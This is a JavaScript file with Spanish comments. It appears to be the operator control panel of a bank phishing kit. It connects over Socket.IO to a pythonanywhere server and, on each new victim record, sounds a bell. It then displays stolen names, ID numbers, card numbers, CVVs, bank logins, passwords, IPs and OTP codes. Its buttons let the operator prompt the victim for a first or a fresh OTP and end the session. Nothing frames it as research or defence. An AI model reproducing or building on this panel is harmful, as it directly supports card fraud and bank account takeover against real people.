const socket = io.connect("GohanSaiyan.pythonanywhere.com"); // Asegúrate de reemplazar 'http://localhost:5000' con la URL de tu servidor

socket.on("new_dataTable", function (object) {
  // Este bloque de código se ejecutará automáticamente cada vez que el servidor emita un evento 'new_dataTable'
  console.log(object); // Imprime los datos recibidos en la consola
  let audio = new Audio("../static/audio/timbre.mp3");

  audio.play().catch(function (error) {
    console.log("Error al reproducir el audio:", error);
  });
  
    const content = document.getElementById("on-dataTables");
    let panel = document.getElementById('panel-' + object.id);

    if(!panel){
        console.log('No existe el panel');
        panel = document.createElement("div");
        panel.id = 'panel-' + object.id;
        content.appendChild(panel);
    }

    panel.className = "card mb-3";

    let options = {
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    };

    date = new Date(object.horacreado).toLocaleDateString("es-ES", options);
    setDate = new Date(object.horamodificado).toLocaleDateString(
      "es-ES",
      options
    );

    panel.innerHTML = `
      <div class="justify-content-center align-items-center mx-auto">
                        <table class="table table-bordered mt-2">
              <thead class="table-primary">
                <tr>
                  <th>Nombre</th>
                  <th>Cédula</th>
                  <th>Direccion</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>${object.nombre}</td>
                  <td>${object.id}</td>
                  <td>${object.direccion}</td>
                </tr>
              </tbody>
              <thead class="table-primary">
                <tr>
                  <th>Tarjeta</th>
                  <th>FTarjeta</th>
                  <th>CVV</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>${object.tarjeta}</td>
                  <td>${object.ftarjeta}</td>
                  <td>${object.cvv}</td>
                </tr>
              </tbody>
              <thead class="table-primary">
                <tr>
                  <th>Email</th>
                  <th>Celular</th>
                  <th>Banco</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>${object.email}</td>
                  <td>${object.celular}</td>
                  <td>${object.banco}</td>
                </tr>
              </tbody>
              <thead class="table-primary">
                <tr>
                  <th>Estado</th>
                  <th>Dispositivo</th>
                  <th>IP</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>${object.status}</td>
                  <td>${object.dispositivo}</td>
                  <td>${object.ip}</td>
                </tr>
              </tbody>
              <thead class="table-primary">
                <tr>
                  <th>Usuario</th>
                  <th>Contraseña</th>
                  <th>OTP</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>${object.usuario}</td>
                  <td>${object.password}</td>
                  <td>${object.otp}</td>
                </tr>
              </tbody>
              <thead class="table-primary">
                <tr>
                  <th>Hora Creado</th>
                  <th>Hora Modificado</th>
                  <th>By</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>${date}</td>
                  <td>${setDate}</td>
                  <td> Gohan </td>
                </tr>
              </tbody>
            </table>
            
            <div class="p-3 mb-2 d-flex justify-content-center">
              <button type="button" class="btn btn-primary btn-sm me-3" id="OTP-button">Pedir OTP</button>
              <button type="button" class="btn btn-primary btn-sm me-3" id="newOTP-button">Nuevo OTP</button>
              <button type="button" class="btn btn-warning btn-sm me-3" id="end-button">Finalizar</button>
            </div>

          </div>
    `;

    let OTPButton = document.getElementById("OTP-button");
    OTPButton.addEventListener("click", function () {
        fetch('events/otp', {
            method: 'POST',
        })
            .then(response => response.json())
            .then(data => {
                console.log(data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
    });

    let newOTPButton = document.getElementById("newOTP-button");
    newOTPButton.addEventListener("click", function () {
        fetch('events/newOtp', {
            method: 'POST',
        })
            .then(response => response.json())
            .then(data => {
                console.log(data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
    });

    let endButton = document.getElementById("end-button");
    endButton.addEventListener("click", function () {
        fetch('events/finish', {
            method: 'POST',
        })
            .then(response => response.json())
            .then(data => {
                console.log(data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
    });

    content.appendChild(panel);


});
